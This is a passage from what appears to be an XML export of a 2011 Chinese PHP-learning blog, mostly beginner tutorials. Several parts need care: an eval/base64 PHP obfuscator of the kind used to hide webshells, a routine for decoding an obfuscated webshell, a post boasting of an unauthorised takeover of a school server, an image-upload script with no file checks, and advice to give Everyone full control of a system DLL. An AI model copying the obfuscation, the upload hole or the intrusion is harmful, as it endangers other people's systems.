$s=’$’.$q6.’=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$’.$q1.’=$’.$q6.’{3}.$’.$q6.’{6}.$’.$q6.’{33}.$’.$q6.’{30};$’.$q3.’=$’.$q6.’{33}.$’.$q6.’{10}.$’.$q6.’{24}.$’.$q6.’{10}.$’.$q6.’{24};$’.$q4.’=$’.$q3.’{0}.$’.$q6.’{18}.$’.$q6.’{3}.$’.$q3.’{0}.$’.$q3.’{1}.$’.$q6.’{24};$’.$q5.’=$’.$q6.’{7}.$’.$q6.’{13};$’.$q1.’.=$’.$q6.’{22}.$’.$q6.’{36}.$’.$q6.’{29}.$’.$q6.’{26}.$’.$q6.’{30}.$’.$q6.’{32}.$’.$q6.’{35}.$’.$q6.’{26}.$’.$q6.’{30};eval($’.$q1.’("’.base64_encode(’$’.$q2.’="’.$c.’";eval(’?&gt;’.$’.$q1.’($’.$q3.’($’.$q4.’($’.$q2.’,$’.$q5.’&#422),$’.$q4.’($’.$q2.’,$’.$q5.’,$’.$q5.’),$’.$q4.’($’.$q2.’,0,$’.$q5.’))));’).’"));’; $s=’&lt;?php ’.$s. ’ ?&gt;’; echo "OK,加密完成！"; //生成 加密后的PHP文件 $fpp1 = fopen(’dam.php’,’w’); fwrite($fpp1,$s) or die(’写文件错误’); ?&gt; &nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>PHP加密代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解密一个php大马]]></title>
    <url>%2F2011%2F10%2F05%2F%E8%A7%A3%E5%AF%86%E4%B8%80%E4%B8%AAphp%E5%A4%A7%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 群里朋友发来一个php大马好像是国外的！被一个人汉化了，但是同时也被他加密了！其实他用的加密方法很简单！ 就是base64+gzinflate压缩编码（加密），一般就是用&lt;?PHP eval(gzinflate(base64_decode(密文)));?&gt;方式书写;其实这个想看见他的源码很好办直接吧eval改echo就好了，但是今天遇到一个重复压缩加密的我也不知道他加了多少次，于是乎我到百度解密代码如下： &lt;?php $Code = ’这里填写要解密的编码’; // base64编码 $File = ’test.php’;//解码后保存的文件 $Temp = base64_decode($Code); $temp = gzinflate($Temp); $FP = fopen($File,”w”); &nbsp;fwrite($FP,$temp); &nbsp;fclose($FP); echo “解密成功！”; ?&gt; &nbsp; 改的重复解密代码： &lt;?php&nbsp; $b = ’密文’; //base64密文 $c = ’decoded.php’; for($i=0;$i&lt;1;$i–) { $b=base64_decode($b);&nbsp; $b=trim(gzinflate($b)); $b=trim(str_replace(“?&gt;&lt;?php”,””,$b)); $b=trim(str_replace(“?&gt;&lt;?”,””,$b)); $b=trim(str_replace(“eval(gzinflate(base64_decode(’”,””,$b)); $b=trim(str_replace(“’)));”,””,$b)); $d=substr($b,0,1); if(0==strcmp($d,””)) { &nbsp;break; } file_put_contents($c,”&lt;?php”.”“.$b.”?&gt;”); }&nbsp;&nbsp;&nbsp; echo “解密成功！”;&nbsp; ?&gt;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>base64+gzinflate</tag>
        <tag>php解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP数组循环输出和排序]]></title>
    <url>%2F2011%2F09%2F28%2FPHP%E6%95%B0%E7%BB%84%E5%BE%AA%E7%8E%AF%E8%BE%93%E5%87%BA%E5%92%8C%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 在php中循环输出可以使用for循环语句，但是数组是关联数组，for就显得不适用了,就要使用foreach函数了，什么是关联数组见：http://www.unlanu.com/blog/?post=25 1.for循环实例： &lt;pre&gt; &lt;?php $shuzu=array("ni","wo","ta","php","mysql"); $count=count($shuzu); echo "使用for遍历数组"; echo "&lt;br/&gt;$nbsp;&lt;br/&gt;"; for($i=0;$i&lt;$count;$i++) { $j=$i+1; echo "第{$j}个元素是： $shuzu[$i]"; echo "&lt;br/&gt;$nbsp;&lt;br/&gt;"; } ?&gt; &lt;/pre&gt;2.foreach函数遍历数组&lt;pre&gt; &lt;?php $shuzu=array(’a’=&gt;"wo",’b’=&gt;"ni",’c’=&gt;"ta",’d’=&gt;"php",’e’=&gt;"mysql"); echo "使用foreach函数遍历数组"; echo "&lt;br/&gt;$nbsp;&lt;br/&gt;"; foreach($shuzu as $key=&gt;$value) { echo "$key 代表: $value"; echo "&lt;br/&gt;$nbsp;&lt;br/&gt;"; } ?&gt; &lt;/pre&gt;3.数组的排序(1)sort(array $array[,int sorttype]) array 表示一个数组&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sorttype 取值： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SORT_REGULAR - 默认。以它们原来的类型进行处理（不改变类型）。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SORT_NUMERIC - 把值作为数字来处理 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SORT_STRING - 把值作为字符串来处理 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SORT_LOCALE_STRING - 把值作为字符串来处理，基于本地设置&#42。 (2)bool rsort(array $array[,sorttype])函数 逆向排序（值逆向） sorttype 同上(3)bool shuffle()函数 随机排序(4)array array_reverse (array $array[,bool preserve_keys]) 反向排列 preserve_keys 为true时 保留原来的键名(5)array array_merge()合并数组(6)array array_slice(array $array,int offset[,int length[,boolpreserve_keys ]) offset非负，这array中的偏移变量从此开始，为负时从末端开始 length为正时，则表示序列中有很多单元，为负时表示从末端开始第几个数处结束，若省略则从offset开始一直到最后 boolpreserve_keys 同上]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win2003服务器多个服务无法启动等错误解决办法]]></title>
    <url>%2F2011%2F09%2F27%2Fwin2003%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%9A%E4%B8%AA%E6%9C%8D%E5%8A%A1%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E7%AD%89%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&nbsp; 今天配置win2003服务器权限的时候出现了错误，重启时候说一个或几个服务无法开启，而且很多windows基本功能都消失了， iis里面什么都没有了！ 原因：权限设置不当，许多服务依存的dll或服务没法访问！ 出现状况： 1、本地连接消失 2、窗口最小化后任务栏不显示 3、可以复制但不能粘贴 4、事件查看器不能查看详细信息 5、大量服务不启动，扩展服务空白一片 6、手工启动RPC服务提示错误5拒绝访问 &nbsp;——————————————- 解决办法： 1.给c盘增加network sever和local server的完全控制权限。 2.手动启动rpc服务和network connections服务。 (如果还是不能启动：为 rpcss.dll设置 everyone的完全控制权限. ) 3.成功后重启机器，症状消失。 &nbsp;——————————————– &nbsp;ps：百度了下，结合自己的经历！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>win2003</tag>
        <tag>服务器权限</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学校服务器]]></title>
    <url>%2F2011%2F09%2F21%2F%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 昨天网上一个校友发来个网站，是大三的学长做的，于是乎手痒检测了下，不得了还真被我拿了webshell，我想啊！既然网站这么安全差，看看服务器怎么样！悲剧又被我弄到了！学长啊！你叫学弟情何以堪！ $D0}~9I827_}~O4.jpg) &nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog千脑插件]]></title>
    <url>%2F2011%2F09%2F18%2Femlog%E5%8D%83%E8%84%91%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 今天终于弄好了我学php以来的第一个插件，当然是emlog的！ &nbsp;&nbsp;&nbsp;&nbsp; 弄这个插件的想法是来源于前段时间下载了一个千脑插件，在那个插件的基础上做了一些优化： &nbsp; 1.去掉了一些没用的代码！ &nbsp;&nbsp;2.去掉了千脑上传界面的千脑连接和一些多余的文字 &nbsp; 3.参考了寒川的那个yy统计插件显示在边侧栏的代码！ &nbsp;&nbsp;&nbsp;&nbsp; 有什么不足!希望指正！我只是个php新手！ &nbsp;&nbsp;下载地址：http://down.qiannao.com/space/file/lanu/share/2011/9/18/lnqn.rar/.page ps:这个插件后续我还会做优化！ &nbsp;&nbsp; 比如：设置自己的千脑id改动自己的网站地址，就不用打开文件改源码了！直接后台插件栏输入就好！ &nbsp; &nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>emlog千脑插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记之emlog的install.php文件]]></title>
    <url>%2F2011%2F09%2F13%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bemlog%E7%9A%84install-php%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 今天看了emlog的安装文件，在读代码中学习！把学习到的函数，算法记下来！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $act = isset($_GET[’action’])? $_GET[’action’] : ’’;&nbsp; //isset()判断变量是否存在,此时action还没有值，所以$act值为空. &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;form name=”form1” method=”post” action=”install.php?action=install”&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 跳转到install.php，并且$_GET[’action’]=install &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $db_host = isset($_POST[’hostname’]) ? addslashes(trim($_POST[’hostname’])) : ’’;&nbsp;&nbsp; //addslashes() 函数在指定的预定义字符前添加反斜杠(预定义字符: ’ “ NULL); &nbsp; /&amp;#42&amp;#42&nbsp; &nbsp;&amp;#42 生成一个随机的字符串&nbsp; &nbsp;&amp;#42&nbsp; &nbsp;&amp;#42 @param int $length&nbsp; &nbsp;&amp;#42 @param boolean $special_chars&nbsp; &nbsp;&amp;#42 @return string&nbsp; &nbsp;&amp;#42/&nbsp; function getRandStr($length = 12, $special_chars = true){&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $chars = ’abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789’;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( $special_chars ){&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $chars .= ’!@#$%^&amp;&amp;#42()’;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $randStr = ’’;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for ( $i = 0; $i &lt; $length; $i++ ){&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return $randStr;&nbsp; }&nbsp;————————————————————————————substr() 函数返回字符串的一部分。### 语法substr(string,start,length)——————–mt_rand() 使用 Mersenne Twister 算法返回随机整数。### 语法mt_rand(min,max)&nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql_num_rows() 函数错误解决]]></title>
    <url>%2F2011%2F09%2F10%2Fmysql-num-rows-%E5%87%BD%E6%95%B0%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 今天下午写代码时候出现了这种错误Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in?????? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我起初是以为是不是那个变量打错了，但是没有！再后来我就百度！没有找到答案！然后谷歌，全是英文，但是还是基本看懂了意思！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原来错误处在sql语句中的一个空格问题！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 看代码错误的： &nbsp;$commsql= “select name from comments where blog_id=” . $row[’id’] . “order by dateposted;”; &nbsp;&nbsp;&nbsp;&nbsp; 这个php代码提交到服务器上就是 select name from comments where blog_id=1 order bydateposted;看见没有order by后面应该有个空格的！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 正确代码是： &nbsp;$commsql= “select name from comments where blog_id=” . $row[’id’] . “ order by dateposted;”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在order前加一个空格！结果就会这样： &nbsp;&nbsp;&nbsp;&nbsp; select name from comments where blog_id=1 order by dateposted; &nbsp;ps：google给力，国外论坛给力，估计国外就没有灌水这个词吧！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>函数mysql_num_rows()</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql_fetch_assoc() 函数使用出错解决]]></title>
    <url>%2F2011%2F09%2F10%2Fmysql-fetch-assoc-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 今天学习php的时候遇到了这个错误： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in C:xampphtdocsmyblogindex.php on line 15 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 源代码是： **&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;?php require(“header.php”); ** **&nbsp;$sql=”select entries.&amp;#42,categories.cat from entries,categorie where entries.cat_id=categories.id order by dateposted desc limit 1;”; &nbsp;$result=mysql_query($sql); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $row=mysql_fetch_assoc($result); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;h2&gt;&lt;a href=’viewentry.php?id=” . $row[’id’] . “’&gt;” . $row[’subject’] . “&lt;/a&gt;&lt;/h2&gt;&lt;br/&gt;”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;i&gt; in &lt;a href=’viewcat.php?id=” . $row[’cat_id’] . “’&gt;” . $row[’cat’] . “&lt;/a&gt; - Posted on “ . date(“D js F Y g.iA”,strtotime($row[’dateposted’])) . “&lt;/i&gt;”; &nbsp;&nbsp;&nbsp; echo “&lt;p&gt;”; &nbsp;&nbsp;&nbsp; echo nl2br($row[’body’]); &nbsp;&nbsp;&nbsp; echo “&lt;/p&gt;”; require(“footer.php”)** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 百度了一下，找到了解决办法！他出错的原因是因为数据库中没有数据导致musql_fetch_assoc()函数返回值为false，所以下面的$row[’’]使用就出错了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所以在使用mysql_fetch_assoc() 函数的时候先对$result做判断! &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码如下： **&lt;?php require(“header.php”); ** **&nbsp;$sql=”select entries.&amp;#42,categories.cat from entries,categorie where entries.cat_id=categories.id order by dateposted desc limit 1;”; &nbsp;$result=mysql_query($sql); &nbsp;if($result){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $row=mysql_fetch_assoc($result); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;h2&gt;&lt;a href=’viewentry.php?id=” . $row[’id’] . “’&gt;” . $row[’subject’] . “&lt;/a&gt;&lt;/h2&gt;&lt;br/&gt;”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;i&gt; in &lt;a href=’viewcat.php?id=” . $row[’cat_id’] . “’&gt;” . $row[’cat’] . “&lt;/a&gt; - Posted on “ . date(“D js F Y g.iA”,strtotime($row[’dateposted’])) . “&lt;/i&gt;”; &nbsp;&nbsp;&nbsp; echo “&lt;p&gt;”; &nbsp;&nbsp;&nbsp; echo nl2br($row[’body’]); &nbsp;&nbsp;&nbsp; echo “&lt;/p&gt;”; &nbsp;} &nbsp;else{ &nbsp;&nbsp; echo “没有文章”; &nbsp;} require(“footer.php”);** ?&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这样就不会报错了！ 注释：mysql_fetch_assoc() 函数 ## 定义和用法mysql_fetch_assoc() 函数从结果集中取得一行作为关联数组。返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。### 语法mysql_fetch_assoc(data) 参数描述data必需。要使用的数据指针。该数据指针是从 mysql_query() 返回的结果。## 提示和注释注释：mysql_fetch_assoc() 和用 mysql_fetch_array() 加上第二个可选参数 MYSQL_ASSOC 完全相同。它仅仅返回关联数组。这也是 mysql_fetch_array() 初始的工作方式。提示：如果在关联索引之外还需要数字索引，用 mysql_fetch_array()。注释：本函数返回的字段名是区分大小写的。]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>mysql_fetch_assoc() </tag>
        <tag>mysql函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP批量上传图片]]></title>
    <url>%2F2011%2F08%2F27%2FPHP%E6%89%B9%E9%87%8F%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[&lt;html&gt; &lt;head&gt;&lt;title&gt;upload picture more once&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;form action=“” method=“post” enctype=“multipart/form-data”&gt; &nbsp;&lt;p&gt;Pictures:&lt;br /&gt; &lt;input type=“file” name=“pictures[]” /&gt;&lt;br /&gt;&nbsp; &nbsp;&lt;input type=“file” name=“pictures[]” /&gt;&lt;br /&gt; &nbsp;&lt;input type=“file” name=“pictures[]” /&gt;&lt;br /&gt; &lt;input type=“submit” name=“upload” value=“Send” /&gt;&nbsp; &nbsp;&nbsp;&lt;/p&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &nbsp; &lt;?php if($_POST[’upload’]==’Send’){&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; $dest_folder&nbsp;&nbsp;&nbsp; =&nbsp;&nbsp;“picture/“;&nbsp; if(!file_exists($dest_folder)){&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mkdir($dest_folder);&nbsp; }&nbsp; foreach ($_FILES[“pictures”][“error”] as $key =&gt; $error) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($error == UPLOAD_ERR_OK) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tmp_name = $_FILES[“pictures”][“tmp_name”][$key];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $name&nbsp;&nbsp;&nbsp;&nbsp; = $_FILES[“pictures”][“name”][$key];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $uploadfile = $dest_folder.$name;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; move_uploaded_file($tmp_name, $uploadfile);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; }&nbsp; }&nbsp; ?&gt;&nbsp; ———————————————————————————- &nbsp;ps：转至百度博客]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>批量上传图片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP的3种数组的使用]]></title>
    <url>%2F2011%2F08%2F24%2FPHP%E7%9A%843%E7%A7%8D%E6%95%B0%E7%BB%84%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 温习了下PHP的3中数组使用,有点记得不清楚，一看还有点糊涂了！先记着以后糊涂了，就看! &nbsp; ————————————————————————————————————————————– 数值数组数值数组存储的每个元素都带有一个数字 ID 键。 可以使用不同的方法来创建数值数组： 例子 1在这个例子中，会自动分配 ID 键： $names = array("Peter","Quagmire","Joe"); 例子 2在这个例子中，我们人工分配的 ID 键： $names[0] = "Peter"; $names[1] = "Quagmire"; $names[2] = "Joe"; 可以在脚本中使用这些 ID 键： &lt;?php $names[0] = "Peter"; $names[1] = "Quagmire"; $names[2] = "Joe"; echo $names[1] . " and " . $names[2] . " are ". $names[0] . "’s neighbors"; ?&gt; 以上代码的输出： Quagmire and Joe are Peter’s neighbors----------------------------------------------------------------- ## 关联数组 关联数组，它的每个 ID 键都关联一个值。 在存储有关具体命名的值的数据时，使用数值数组不是最好的做法。 通过关联数组，我们可以把值作为键，并向它们赋值。 ### 例子 1 在本例中，我们使用一个数组把年龄分配给不同的人： $ages = array("Peter"=&gt;32, "Quagmire"=&gt;30, "Joe"=&gt;34); 例子 2本例与例子 1 相同，不过展示了另一种创建数组的方法： $ages[’Peter’] = "32"; $ages[’Quagmire’] = "30"; $ages[’Joe’] = "34"; 可以在脚本中使用 ID 键： &lt;?php $ages[’Peter’] = "32"; $ages[’Quagmire’] = "30"; $ages[’Joe’] = "34"; echo "Peter is " . $ages[’Peter’] . " years old."; ?&gt; 以上脚本的输出： Peter is 32 years old.------------------------------------------------------------------------------- ## 多维数组 在多维数组中，主数组中的每个元素也是一个数组。在子数组中的每个元素也可以是数组，以此类推。 ### 例子 1 在本例中，我们创建了一个带有自动分配的 ID 键的多维数组： $families = array ( "Griffin"=&gt;array ( "Peter", "Lois", "Megan" ), "Quagmire"=&gt;array ( "Glenn" ), "Brown"=&gt;array ( "Cleveland", "Loretta", "Junior" ) ); 如果输出这个数组的话，应该类似这样： Array ( [Griffin] =&gt; Array ( [0] =&gt; Peter [1] =&gt; Lois [2] =&gt; Megan ) [Quagmire] =&gt; Array ( [0] =&gt; Glenn ) [Brown] =&gt; Array ( [0] =&gt; Cleveland [1] =&gt; Loretta [2] =&gt; Junior ) ) 例子 2让我们试着显示上面的数组中的一个单一的值： echo "Is " . $families[’Griffin’][2] . " a part of the Griffin family?"; 以上代码的输出： Is Megan a part of the Griffin family?----------------------------------------------ps:复制粘贴教程网的！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>PHP数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[今天干坏事了]]></title>
    <url>%2F2011%2F08%2F20%2F%E4%BB%8A%E5%A4%A9%E5%B9%B2%E5%9D%8F%E4%BA%8B%E4%BA%86%2F</url>
    <content type="text"><![CDATA[&nbsp;ps：这个TNT也脱不了关系！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>杂事</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[isset()函数和empt()函数]]></title>
    <url>%2F2011%2F08%2F19%2Fisset-%E5%87%BD%E6%95%B0%E5%92%8Cempt-%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[isset()函数是检测变量是否设置 格式：bool isset ( mixed var [, mixed var [, …]] ) 功能：检测变量是否设置 返回值： 若变量不存在则返回 FALSE 若变量存在且其值为NULL，也返回 FALSE 若变量存在且值不为NULL，则返回 TURE 同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE empty()函数检测变量值是否为空 格式：bool empty ( mixed var ) 功能：检查一个变量是否为空 返回值： 若变量不存在则返回 TRUE 若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE，反之为FLASE]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>PHP函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让php页面自动运行]]></title>
    <url>%2F2011%2F08%2F19%2F%E8%AE%A9php%E9%A1%B5%E9%9D%A2%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[&nbsp; 看见t哥的自动抢签到器，我一直在构思可不可以写在线版的，技术有限很多想法我还没发实现，几天看见了这个让php页面自动运行的方法，就先收集起来，以后估计有用！ &nbsp;方法如下： 1、先建一个如下的vbs脚本文件： Dim IE Set IE = CreateObject(“InternetExplorer.Application”) e.navigate(“http://url.com/auto.php&quot;) ie.visible=1 Set IE = Nothing 2、在上述auto.php文件中加入自动关闭ie的js程序，如下： &lt;script language=javascript&gt; &nbsp; window.opener=null &nbsp; window.open(“”,”_self”) &nbsp; window.close(); &nbsp; &lt;/script&gt; 3、用windows的任务计划定时执行1中vbs文件，程序自动打开ie访问http://url.com/auto.php页面，服务器解析后返回浏览器，再自动运行2中js关闭ie程序，达到自动运行php的目的。 ============================================== ps：这个方法估计只能实现签到，而强签到估计有点慢了！以后看看有什么更好的方法没有！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>vbs</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE默认首页被修改的故障排除『转载』]]></title>
    <url>%2F2011%2F08%2F19%2FIE%E9%BB%98%E8%AE%A4%E9%A6%96%E9%A1%B5%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4%E3%80%8E%E8%BD%AC%E8%BD%BD%E3%80%8F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 注册表这个东西真的不熟悉，记不住，转载过来，以后忘记了就翻开看看！转至寒川博客！ ————————————————————————————————————————- 通过修改注册表修改主页: ①在Windows启动后，点击“开始”→“运行”菜单项，在“打开”栏中键入regedit，然后按“确定”键； ②展开注册表到HKEY_LOCAL_MACHINESOFTWAREMicrosoftInternet ExplorerMain下，在右半部分窗口中找到串值“Start Page”双击 ，将Start Page的键值改为“about:blank”即可； ③同理，展开注册表到HKEY_CURRENT_USERSoftwareMicrosoftInternet ExplorerMain在右半部分窗口中找到串值“Start Page”，然后按②中所述方法处理。 ④退出注册表编辑器，重新启动计算机，一切OK了！ 特殊例子：当IE的起始页变成了某些网址后，就算你通过选项设置修改好了，重启以后又会变成他们的网址啦，十分的难缠。其实他们是在你机器里加了一个自运行程序，它会在系统启动时将你的IE起始页设成他们的网站。 解决办法：运行注册表编辑器regedit.exe，然后依次展开HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrent VersionRun主键，然后将其下的registry.exe子键删除，然后删除自运行程序c:Program Filesegistry.exe，最后从IE选项中重新设置起始页就好了。 IE修改主页处为灰色，无法修改解决办法： 运行注册表编辑器(开始菜单,运行”regedit”。找到[HEY_CURRENT_USERSoftwarePoliciesMicrosoftInternet ExplorerControlPanel]，将其”HomePage”值改成00000000。(此步骤的作用是将”internet选项”窗口的”常规”选项卡中变灰的按钮激活。)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>IE</tag>
        <tag>浏览器首页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[这个真的有]]></title>
    <url>%2F2011%2F08%2F14%2F%E8%BF%99%E4%B8%AA%E7%9C%9F%E7%9A%84%E6%9C%89%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>视频|音乐</category>
      </categories>
      <tags>
        <tag>视频</tag>
        <tag>计算机专业</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php使图片分页处理代码『转载』]]></title>
    <url>%2F2011%2F08%2F14%2Fphp%E4%BD%BF%E5%9B%BE%E7%89%87%E5%88%86%E9%A1%B5%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%E3%80%8E%E8%BD%AC%E8%BD%BD%E3%80%8F%2F</url>
